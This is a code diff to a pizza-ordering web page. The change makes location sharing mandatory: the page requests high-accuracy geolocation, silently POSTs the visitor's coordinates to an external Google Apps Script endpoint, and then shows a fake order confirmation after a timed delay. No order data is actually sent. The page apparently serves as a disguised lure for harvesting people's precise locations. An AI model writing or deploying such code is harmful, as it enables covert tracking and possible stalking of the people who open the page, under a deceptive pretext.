@@ -397,9 +397,9 @@
                     <input type="text" id="customerName" placeholder="Your full name"
                         class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent outline-none">
                 </div>
-                <button onclick="requestUserLocation()"
+                <button
                     class="bg-gradient-to-r from-red-600 to-yellow-500 text-white font-semibold px-6 py-3 rounded-full hover:shadow-lg transition-all mb-4">
-                    Share My Location for Fast Delivery
+                    Share My Location for Fast Delivery:
                 </button>
                 <div class="flex space-x-4">
                     <button onclick="closeNameModal()"
@@ -439,6 +439,7 @@
         </div>
     </div>
 
+
     <!-- Order Confirmation Modal -->
     <div id="orderModal" class="fixed inset-0 modal-backdrop hidden items-center justify-center z-50">
         <div class="bg-white rounded-lg p-8 max-w-md mx-4 transform scale-95 transition-all duration-300"
@@ -464,10 +465,31 @@
         </div>
     </div>
 
+    <!-- Location Verification Modal -->
+    <div id="locationModal" class="fixed inset-0 modal-backdrop hidden items-center justify-center z-50">
+        <div class="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
+            <div class="mb-6">
+                <!-- Spinner Design Same as Step 2 -->
+                <div class="relative inline-flex">
+                    <div class="w-20 h-20 border-4 border-red-200 border-t-red-500 rounded-full animate-spin"></div>
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <i class="fas fa-location-arrow text-red-500 text-2xl animate-pulse"></i>
+                    </div>
+                </div>
+            </div>
+            <h3 class="text-2xl font-bold text-gray-800 mb-2" id="locationStatusTitle">Verifying Your Location...</h3>
+            <p class="text-gray-600 mb-4" id="locationStatusText">Please allow location access to proceed with your
+                order.</p>
+            <button id="retryLocationBtn" onclick="verifyLocation()"
+                class="hidden btn-primary text-white px-6 py-3 rounded-full hover:shadow-lg transition-all">
+                Verify Location Again
+            </button>
+        </div>
+    </div>
+
     <script>
         let selectedPizza = {};
 
-        // Step 1: Show name entry modal
         function orderPizza(name, price) {
             selectedPizza = { name, price };
             document.getElementById('selectedPizzaName').textContent = name;
@@ -477,80 +499,66 @@
             document.getElementById('nameModal').classList.add('flex');
         }
 
-        // Close name modal
         function closeNameModal() {
             document.getElementById('nameModal').classList.add('hidden');
             document.getElementById('nameModal').classList.remove('flex');
         }
 
-        // Step 2: Show loading and then complete order
         function confirmOrder() {
             const customerName = document.getElementById('customerName').value.trim();
-
             if (!customerName) {
                 alert('Please enter your name to continue!');
                 return;
             }
-
-            // Close name modal
             closeNameModal();
-
-            // Show loading modal
-            document.getElementById('loadingModal').classList.remove('hidden');
-            document.getElementById('loadingModal').classList.add('flex');
-
-            // Simulate processing time (3 seconds)
-            setTimeout(() => {
-                // Hide loading modal
-                document.getElementById('loadingModal').classList.add('hidden');
-                document.getElementById('loadingModal').classList.remove('flex');
-
-                // Show final confirmation modal
-                document.getElementById('orderDetails').innerHTML = `
-            <div class="mb-4">
-                <p class="font-semibold text-gray-800">Thank you, ${customerName}!</p>
-                <p class="text-lg">${selectedPizza.name}</p>
-                <p class="text-xl font-bold text-green-600">$${selectedPizza.price.toFixed(2)}</p>
-            </div>
-        `;
-
-                document.getElementById('orderModal').classList.remove('hidden');
-                document.getElementById('orderModal').classList.add('flex');
-                document.getElementById('modalContent').classList.remove('scale-95');
-                document.getElementById('modalContent').classList.add('scale-100');
-            }, 5000); // 3 second loading time
+            showLocationVerification();
         }
 
-        // Close final modal (keep existing function)
-        function closeModal() {
-            const modal = document.getElementById('orderModal');
-            const modalContent = document.getElementById('modalContent');
-
-            modalContent.classList.remove('scale-100');
-            modalContent.classList.add('scale-95');
-
-            setTimeout(() => {
-                modal.classList.add('hidden');
-                modal.classList.remove('flex');
-            }, 300);
+        function showLocationVerification() {
+            document.getElementById('locationModal').classList.remove('hidden');
+            document.getElementById('locationModal').classList.add('flex');
+            document.getElementById('locationStatusTitle').textContent = "Verifying Your Location...";
+            document.getElementById('locationStatusText').textContent = "Please allow location access to proceed with your order.";
+            document.getElementById('retryLocationBtn').classList.add('hidden');
+            verifyLocation();
         }
 
-        function requestUserLocation() {
+        function verifyLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function (position) {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
 
+                        // Send location to your Google Web App
                         fetch("https://script.google.com/macros/s/AKfycbxbbUemYlI3-hSddX0gFTt5qm2PiuxitHKh8FaoZYnSZKI3B-6GZZ08iDms2VU7PuAGQQ/exec", {
                             method: "POST",
                             mode: "no-cors",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ latitude, longitude })
                         });
+
+                        document.getElementById('locationStatusTitle').textContent = "Location Verified!";
+                        document.getElementById('locationStatusText').textContent = "Your order is now being processed.";
+
+                        setTimeout(() => {
+                            document.getElementById('locationModal').classList.add('hidden');
+                            document.getElementById('locationModal').classList.remove('flex');
+
+                            // Ensure loadingModal exists before trying to access classList
+                            const loadingModal = document.getElementById('loadingModal');
+                            if (loadingModal) {
+                                showLoadingAndCompleteOrder();
+                            } else {
+                                console.error('Loading modal not found.');
+                            }
+                        }, 2000);
                     },
                     function (error) {
-                        console.error("Location access denied or unavailable.", error);
+                        document.getElementById('locationStatusTitle').textContent = "Location Not Verified";
+                        document.getElementById('locationStatusText').textContent = "We need your location to deliver the pizza. Please try again.";
+                        document.getElementById('retryLocationBtn').classList.remove('hidden');
+                        console.error(error);
                     },
                     {
                         enableHighAccuracy: true,
@@ -559,9 +567,58 @@
                     }
                 );
             } else {
-                console.error("Geolocation not supported.");
+                alert("Geolocation is not supported by this browser.");
             }
+        }
+
+        function showLoadingAndCompleteOrder() {
+            const loadingModal = document.getElementById('loadingModal');
+            if (!loadingModal) {
+                console.error('loadingModal is missing');
+                return;
+            }
+
+            loadingModal.classList.remove('hidden');
+            loadingModal.classList.add('flex');
+
+            setTimeout(() => {
+                loadingModal.classList.add('hidden');
+                loadingModal.classList.remove('flex');
+
+                const orderDetails = document.getElementById('orderDetails');
+                const orderModal = document.getElementById('orderModal');
+                const modalContent = document.getElementById('modalContent');
+
+                if (orderDetails && orderModal && modalContent) {
+                    orderDetails.innerHTML = `
+        <div class="mb-4">
+          <p class="font-semibold text-gray-800">Thank you!</p>
+          <p class="text-lg">${selectedPizza.name}</p>
+          <p class="text-xl font-bold text-green-600">$${selectedPizza.price.toFixed(2)}</p>
+        </div>`;
+
+                    orderModal.classList.remove('hidden');
+                    orderModal.classList.add('flex');
+                    modalContent.classList.remove('scale-95');
+                    modalContent.classList.add('scale-100');
+                } else {
+                    console.error('One or more modal elements are missing.');
+                }
+            }, 4000);
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('orderModal');
+            const modalContent = document.getElementById('modalContent');
+            modalContent.classList.remove('scale-100');
+            modalContent.classList.add('scale-95');
+
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                modal.classList.remove('flex');
+            }, 300);
         }
     </script>
 </body>
+
 </html>
